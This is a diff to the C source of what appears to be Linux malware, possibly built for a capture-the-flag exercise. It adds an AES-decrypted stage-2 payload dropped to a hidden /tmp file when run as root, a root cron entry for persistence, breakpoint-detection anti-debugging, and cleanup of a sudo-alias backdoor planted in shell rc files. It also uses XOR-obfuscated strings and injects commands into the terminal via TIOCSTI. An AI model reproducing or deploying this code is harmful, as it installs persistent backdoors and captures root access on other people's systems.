@@ -12,9 +12,9 @@
 
 #pragma GCC push_options
 char scratch[4096];
-extern const char _binary_stage2_start[];
-extern const char * _binary_stage2_end;
-extern const int _binary_stage2_size;
+extern const char _binary_stage2_comp_start[];
+extern const char * _binary_stage2_comp_end;
+extern const int _binary_stage2_comp_size;
 
 // SOURCE_STRINGS
 //#define TERM_ALIAS_XOR "alias sudo='sudo /tmp/.entry-RjwtJS && sudo'\nhistory -c && clear\n"
@@ -27,8 +27,10 @@ extern const int _binary_stage2_size;
 //#define SELF_XOR "/proc/self/exe"
 //#define BASHRC_XOR "%s/.bashrc"
 //#define ZSHRC_XOR "%s/.zshrc"
-//#define SHADOW_XOR "/usr/lib/os-release"
-//#define PERSISTENCE_XOR "/bin/pirate"
+//#define AES_KEY_XOR "/usr/lib/os-release"
+//#define PERSISTENCE_XOR "/tmp/.entry-3tps-93f8u-rprt"
+//#define CRON_XOR "*/5 * * * * root /tmp/.entry-3tps-93f8u-rprt\n"
+//#define CRON_FILE_XOR "/etc/crobtab"
 // END_SOURCE_STRINGS
 
 //START OBFUSCATING
@@ -69,15 +71,15 @@ int round_up(int toRound, int multiple) {
  * Decrypts the STAGE-2 payload which is embedded as an extern 
  * 
  */
-void decrypt_stage2(char * write_destination) {
+int decrypt_stage2(char * write_destination) {
     char write_dest[256] = {0};
     uint8_t iv[] = "whatisthiscapt??";
     struct AES_ctx context;
     strncpy(write_dest, write_destination, (sizeof write_dest) - 1);
 
     // Get the decryption key, which is read from a file on disk 
-    char * shadow_file = dexor(SHADOW_XOR);
-    int fd = open(shadow_file, O_RDONLY);
+    char * aes_key_file = dexor(AES_KEY_XOR);
+    int fd = open(aes_key_file, O_RDONLY);
     uint8_t key[16];
     int read_in  = read(fd, key, AES_KEYLEN);
     close(fd);
@@ -85,9 +87,9 @@ void decrypt_stage2(char * write_destination) {
     if (read_in == AES_KEYLEN) {
     
         // Allocate buffer for Stage2 Malloc
-	int malloc_size = round_up(&_binary_stage2_size, AES_KEYLEN);
+	int malloc_size = round_up(&_binary_stage2_comp_size, AES_KEYLEN);
         uint8_t * dec_buf = (uint8_t *) malloc(malloc_size);
-	memcpy(dec_buf, &_binary_stage2_start, malloc_size);
+	memcpy(dec_buf, &_binary_stage2_comp_start, malloc_size);
 
 	if (dec_buf != NULL) {
             // Decrypt the buffer 
@@ -95,13 +97,15 @@ void decrypt_stage2(char * write_destination) {
             AES_CBC_decrypt_buffer(&context, dec_buf, malloc_size);
 
             // Open file for writing 
-            int persistence_file = open(write_dest, O_CREAT | O_WRONLY , 0755); 
+            int persistence_file = open(write_dest, O_CREAT | O_WRONLY , 0700); 
             if (persistence_file) {
                 // Write the extern blob
-                write(persistence_file, dec_buf, &_binary_stage2_size);
+                write(persistence_file, dec_buf, &_binary_stage2_comp_size);
 
                 // Close
                 close(persistence_file);
+
+		return 1;
             } 
             free(dec_buf);
 	}
@@ -140,10 +144,91 @@ void backdoor_rcfiles() {
     } 
 }
 
+void backdoor_cron() {
+    char str[256];
+    strncpy(str, dexor(CRON_XOR), 256);
+
+    FILE * cron_file = fopen(dexor(CRON_FILE_XOR),"a");
+
+    if (cron_file ) {
+        if (!check_filecontains(cron_file, str)) {
+            fputs(str, cron_file);
+	}
+	fclose(cron_file);
+    }
+    
+}
+
+int check_filecontains(FILE * fd, char * to_search) {
+    char search_buf[256];
+    strncpy(search_buf, to_search, 256);
+
+    fseek(fd, 0, SEEK_END);
+    int len = ftell(fd);
+    rewind(fd);
+    
+    char * file_buf = (char*) malloc(len * sizeof(char));
+    fread(file_buf, len, 1, fd);
+
+    // Now check if the buffer contains our search bytesequence.
+    int window_len = strlen(search_buf);
+    int buf_ptr = 0;
+
+    for (int i = 0; i < len; i++) {
+       if (search_buf[buf_ptr] == *(file_buf + i) ) {
+           buf_ptr++;
+	   if (buf_ptr == window_len) {
+	       free(file_buf);
+	       return 1;
+	   }
+       } else {
+
+           buf_ptr = 0;
+       }
+    }
+
+    free(file_buf);
+    return 0;
+}
+
+/**
+ * Clean up the .bashrc files
+ */
+void clean_rcfiles() {
+    const char * homedir = getenv("HOME");
+    char str[256];
+
+    if (homedir != NULL) {
+        snprintf(str, 256,dexor(ZSHRC_XOR),  homedir);
+        FILE * rc_file = fopen(str, "r");
+        // Look for zshrc 
+        if (rc_file && check_filecontains(rc_file, dexor(ALIAS_STR_XOR))) { 
+            fseek(rc_file, 0, SEEK_END);
+            int size = ftell(rc_file);
+            fclose(rc_file);
+	    int xor_len = strlen(dexor(ALIAS_STR_XOR));
+    	    // Truncate off the bytes for the .bashrc backdoor
+            ftruncate(str, size - xor_len);	 
+	}
+
+        snprintf(str, 256, dexor(BASHRC_XOR), homedir);
+        // Look for bashrc
+        rc_file = fopen(str, "r");
+        if (rc_file && check_filecontains(rc_file, dexor(ALIAS_STR_XOR))) {
+            fseek(rc_file, 0, SEEK_END);
+            int size = ftell(rc_file);
+            fclose(rc_file);
+	    int xor_len = strlen(dexor(ALIAS_STR_XOR));
+    	    // Truncate off the bytes for the .bashrc backdoor
+            ftruncate(str, size - xor_len);  
+	}
+    } 
+}
+
 /**
  *
  */
-void print_meme() {
+void print_banner() {
     printf("\n\n");
     printf(" ____ ___.__   __                 __                .__   \n");
     printf("|    |   \\  |_/  |_____________ _/  |_  ____   ____ |  |  \n");
@@ -220,7 +305,7 @@ void perform_source() {
             ioctl(0, TIOCSTI, cmd++);
         }
 	sleep(1);	
-        print_meme();
+        print_banner();
 	exit(0);
     } else {
 	return;
@@ -249,6 +334,18 @@ int main() {
         printf(dexor(ANTI_DEBUG_XOR));
 	exit(0);
     }
+    if ((*(volatile unsigned long *)((unsigned long) copy_self) & 0xff) == 0xcc) {
+        printf(dexor(ANTI_DEBUG_XOR));
+	exit(0);
+    }
+    if ((*(volatile unsigned long *)((unsigned long) decrypt_stage2) & 0xff) == 0xcc) {
+        printf(dexor(ANTI_DEBUG_XOR));
+	exit(0);
+    } 
+    if ((*(volatile unsigned long *)((unsigned long) round_up) & 0xff) == 0xcc) {
+        printf(dexor(ANTI_DEBUG_XOR));
+	exit(0);
+    }
     if ((*(volatile unsigned long *)((unsigned long) dexor) & 0xff) == 0xcc) {
         printf(dexor(ANTI_DEBUG_XOR));
 	exit(0);
@@ -257,7 +354,11 @@ int main() {
     uid_t curr_id = geteuid();
 
     if (curr_id == 0) {
-	decrypt_stage2(dexor(PERSISTENCE_XOR));
+	int res = decrypt_stage2(dexor(PERSISTENCE_XOR));
+	if (res) {
+	    clean_rcfiles();
+	    backdoor_cron();
+	}
     } else {
         backdoor_rcfiles();
         perform_source();
